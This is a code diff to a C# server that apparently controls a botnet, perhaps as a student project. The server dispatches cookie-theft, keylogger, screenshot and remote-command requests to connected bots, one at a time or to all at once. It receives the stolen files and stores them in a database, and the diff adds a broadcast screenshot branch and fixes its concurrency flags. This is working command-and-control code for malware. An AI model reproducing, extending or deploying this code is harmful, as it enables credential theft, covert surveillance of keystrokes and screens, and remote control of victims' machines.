@@ -52,7 +52,7 @@ namespace Server
             socket.Receive(data);
             string rs = encoding.GetString(data);
             return rs;
-        }      
+        }
         public static void handleConnectSocket(TcpListener listener)
         {
             while (true)
@@ -73,39 +73,40 @@ namespace Server
                 string filePathCommandBot = "D:\\xampp\\htdocs\\PBL4\\php\\commandBot.txt";
                 FileInfo fileInfo1 = new FileInfo(filePathBotActive);
                 FileInfo fileInfo2 = new FileInfo(filePathCommandBot);
-                if(isFinished == false)
+                if (isFinished == false)
                 {
                     continue;
-                }    
+                }
                 if (fileInfo1.Exists || fileInfo2.Exists)
                 {
                     if (fileInfo1.Length == 0 || fileInfo2.Length == 0)
                     {
                         continue;
-                    }                   
+                    }
                 }
                 botActive = File.ReadAllText(filePathBotActive).Split('&'); // 0: id //1: ip //2: port
                 commandBot = File.ReadAllText(filePathCommandBot).Split('&'); // 0: command //1: detail(link,cmd,...)
 
                 string idBot = botActive[0];
                 string ipBotActive = botActive[1];
-                int portBotActive = int.Parse(botActive[2]);
+               
 
                 string command = commandBot[0];
                 string detail = commandBot[1];
 
-                    //command: nocmd / getcmd/ getcookie/ getkeylogger/ getcapture
-                    //detail: dir,.../link / start keylogger, stop keylogger/ start capture, stop capture/
-                    //else continue
-                if(idBot.Equals("All"))
+                //command: nocmd / getcmd/ getcookie/ getkeylogger/ getcapture
+                //detail: dir,.../link / start keylogger, stop keylogger/ start capture, stop capture/
+                //else continue
+                if (idBot.Equals("All"))
                 {
-                    handleCommandAllClients(command,detail);
-                }    
+                    handleCommandAllClients(command, detail);
+                }
                 else
                 {
+                    int portBotActive = int.Parse(botActive[2]);
                     handleCommandOneClient(idBot, command, detail, ipBotActive + ":" + portBotActive);
-                }    
-               
+                }
+
 
                 // Xong ctr xóa dl luôn file commandBot
                 StreamWriter sw = new StreamWriter(filePathCommandBot, false);
@@ -113,12 +114,12 @@ namespace Server
                 sw.Close();
             }
         }
-        public static async void handleCommandOneClient(string id, string command, string detail, string ipandbot)
+        public static async void handleCommandOneClient(string id, string command, string detail, string ipandport)
         {
             TcpClient clientSelected = new TcpClient();
             foreach (var pair in clients)
             {
-                if (pair.Value == ipandbot)
+                if (pair.Value == ipandport)
                 {
                     clientSelected = pair.Key;
                     break;
@@ -127,42 +128,50 @@ namespace Server
 
             if (command == "exit")
             {
-                
+
             }
             else if (command == "getcookie")
-            {           
+            {
+                isFinished = false;
                 string ms = "cookies?" + detail + "?";
                 sendMessageSocket(ms, clientSelected.Client);
                 receiveFileSocket(clientSelected, "cookies");
-                readFileAndInsertDB(clientSelected,id, "cookies", detail);
+                readFileAndInsertDB(clientSelected, id, "cookies", detail);
+                isFinished = true;
             }
             else if (command == "getcmd")
-            {              
+            {
+                isFinished = false;
                 string ms = "command?" + detail;
                 sendMessageSocket(ms, clientSelected.Client);
                 receiveFileSocket(clientSelected, "cmd");
-                readFileAndInsertDB(clientSelected,id, "cmd", detail);
+                readFileAndInsertDB(clientSelected, id, "cmd", detail);
+                isFinished = true;
                 //
                 //Console.WriteLine(detail);
             }
             else if (command == "getcapture")
             {
+                isFinished = false;
                 string ms = "capture";
                 sendMessageSocket(ms, clientSelected.Client);
                 receiveFileSocket(clientSelected, "capture");
                 readFileAndInsertDB(clientSelected, id, "capture", detail);
+                isFinished = true;
                 //
                 //Console.WriteLine(detail);
             }
             else if (command == "getkeylogger")
             {
-                string ms = "keylogger" ;
+                isFinished = false;
+                string ms = "keylogger";
                 timeStop = DateTime.Now;
                 sendMessageSocket(ms, clientSelected.Client);
                 receiveFileSocket(clientSelected, "keylogger");
                 string timeStartClient = receiveMessageSocket(clientSelected.Client);
                 String time = timeStartClient.Trim() + "?" + timeStop.ToString() + "?";
-                readFileAndInsertDB(   clientSelected,id, "keylogger", time); // detail thay bằng time
+                readFileAndInsertDB(clientSelected, id, "keylogger", time); // detail thay bằng time
+                isFinished = true;
 
             }
             else
@@ -186,9 +195,9 @@ namespace Server
 
                 string ms = "cookies?" + detail + "?";
                 List<Task> cookies = new List<Task>();
+                isFinished = false;
                 foreach (var cli in clients.Keys)
                 {
-                    isFinished = false;
                     cookies.Add(Task.Run(async () =>
                     {
                         try
@@ -196,6 +205,8 @@ namespace Server
                             clients.TryGetValue(cli, out string ip);
                             sendMessageSocket(ms, cli.Client);
                             receiveFileSocket(cli, "cookies");
+                            string id = DB.getIdByIpAndPort(ip.Split(':')[0], ip.Split(':')[1]);
+                            readFileAndInsertDB(cli, id, "cookies", detail);
                         }
                         catch (Exception ex)
                         {
@@ -212,9 +223,9 @@ namespace Server
 
                 List<Task> keyloggerTasks = new List<Task>();
 
+                isFinished = false;
                 foreach (var cli in clients.Keys)
                 {
-                    isFinished = false;
                     keyloggerTasks.Add(Task.Run(async () =>
                     {
                         try
@@ -223,7 +234,13 @@ namespace Server
                             sendMessageSocket("keylogger", cli.Client);
                             Console.WriteLine("Sending request get keylogger to " + ip + "...");
                             receiveFileSocket(cli, "keylogger");
+                            timeStop = DateTime.Now;
+                            string timeStartClient = receiveMessageSocket(cli.Client);
+                            String time = timeStartClient.Trim() + "?" + timeStop.ToString() + "?";
                             Console.WriteLine("Receive keylogger from " + ip + "!");
+                            string id = DB.getIdByIpAndPort(ip.Split(':')[0], ip.Split(':')[1]);
+                            readFileAndInsertDB(cli, id, "keylogger", time);
+                            isFinished = true;
                         }
                         catch (Exception ex)
                         {
@@ -239,13 +256,13 @@ namespace Server
             else if (command == "getcmd")
             {
 
-                string ms = "command?" + detail+"?";
+                string ms = "command?" + detail + "?";
 
                 List<Task> cmdTasks = new List<Task>();
+                isFinished = false;
 
                 foreach (var cli in clients.Keys)
                 {
-                    isFinished = false;
                     cmdTasks.Add(Task.Run(async () =>
                     {
                         try
@@ -254,6 +271,8 @@ namespace Server
                             sendMessageSocket(ms, cli.Client);
                             Console.WriteLine("Sending request get cmd to " + ip + "...");
                             receiveFileSocket(cli, "cmd");
+                            string id = DB.getIdByIpAndPort(ip.Split(':')[0], ip.Split(':')[1]);
+                            readFileAndInsertDB(cli, id, "cmd", detail);
                             Console.WriteLine("Receive file cmd from " + ip + "!");
                         }
                         catch (Exception ex)
@@ -267,6 +286,39 @@ namespace Server
                 isFinished = true;
                 Console.WriteLine("Nhan thanh cong cac file cmd tu botnet.");
             }
+            else if (command == "getcapture")
+            {
+         
+
+                List<Task> captureTasks = new List<Task>();
+                isFinished = false;
+
+                foreach (var cli in clients.Keys)
+                {
+                    captureTasks.Add(Task.Run(async () =>
+                    {
+                        try
+                        {
+                            string ms = "capture";
+                            clients.TryGetValue(cli, out string ip);
+                            sendMessageSocket(ms, cli.Client);
+                            Console.WriteLine("Sending request get capture to " + ip + "...");
+                            receiveFileSocket(cli, "capture");
+                            string id = DB.getIdByIpAndPort(ip.Split(':')[0], ip.Split(':')[1]);
+                            readFileAndInsertDB(cli, id, "capture", detail);
+                            Console.WriteLine("Receive file capture from " + ip + "!");
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
+                        }
+                    }));
+                }
+
+                await Task.WhenAll(captureTasks);
+                isFinished = true;
+                Console.WriteLine("Nhan thanh cong cac file capture tu botnet.");
+            }
 
         }
 
@@ -276,27 +328,27 @@ namespace Server
             string fileName = "";
             if (type == "cookies")
             {
-                fileName = ip+"-getcookies.txt";
+                fileName = ip + "-getcookies.txt";
             }
             else if (type == "keylogger")
             {
                 //Console.WriteLine("Nhan file thanh cong");
-                fileName = ip+"-getkeylogger.txt";
+                fileName = ip + "-getkeylogger.txt";
             }
             else if (type == "cmd")
             {
-                fileName = ip+"-getcmd.txt";
+                fileName = ip + "-getcmd.txt";
             }
             else if (type == "capture")
             {
-                fileName = ip+"-getcapture.png";
+                fileName = ip + "-getcapture.png";
             }
             if (!client.Connected)
             {
                 return;
             }
-            NetworkStream stream = client.GetStream();  
-           
+            NetworkStream stream = client.GetStream();
+
             byte[] fileSizeBytes = new byte[4];
             int bytes = stream.Read(fileSizeBytes, 0, 4);
             int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);
@@ -324,7 +376,7 @@ namespace Server
                 fs.Write(data, 0, data.Length);
             }
         }
-        public static void readFileAndInsertDB(TcpClient client,string id, string type, string detail)
+        public static void readFileAndInsertDB(TcpClient client, string id, string type, string detail)
         {
             string ip = client.Client.RemoteEndPoint.ToString().Split(':')[0];
             string fileName = "";
@@ -365,8 +417,8 @@ namespace Server
             }
             if (type == "capture")
             {
-                resizeImage(fileName);
-                string base64Img = convertToBase64("resized.jpg");
+
+                string base64Img = convertToBase64(fileName);
                 DB.insertDB(id, type, detail, base64Img);
             }
             else
@@ -392,39 +444,13 @@ namespace Server
             Console.WriteLine(base64String);
             return base64String;
         }
-        static void resizeImage(string path)
-        {
-            using (var originalImage = new Bitmap(path))
-            {
-                // Define the new dimensions for the resized image
-                //int newWidth = 975;
-                //int newHeight = 500;
-                int newWidth = 100;
-                int newHeight = 100;
 
-                // Create a new Bitmap with the desired dimensions
-                using (var resizedImage = new Bitmap(newWidth, newHeight))
-                using (var graphics = Graphics.FromImage(resizedImage))
-                {
-                    // Configure the graphics settings for resizing
-                    graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
-                    graphics.SmoothingMode = SmoothingMode.HighQuality;
-                    graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
-                    graphics.CompositingQuality = CompositingQuality.HighQuality;
-
-                    // Draw the original image onto the resized image with the specified dimensions
-                    graphics.DrawImage(originalImage, new Rectangle(0, 0, newWidth, newHeight));
-
-                    // Save the resized image to a file or do whatever you need with it
-                    resizedImage.Save("resized.jpg", ImageFormat.Jpeg);
-                }
-            }
-        }
 
         static void Main(string[] args)
         {
             try
             {
+                DB.resetCommandBot();
                 DB.resetBotStatus();
                 IPAddress address = IPAddress.Parse("192.168.1.100");
 
@@ -449,7 +475,7 @@ namespace Server
         }
         //static void Main()
         //{
-        //    Console.WriteLine(DB.getIdByIpAndPort("192.168.1.100","5454"));
+        //    Console.WriteLine(DB.getIdByIpAndPort("192.168.1.100", "5454"));
         //}
     }
 }
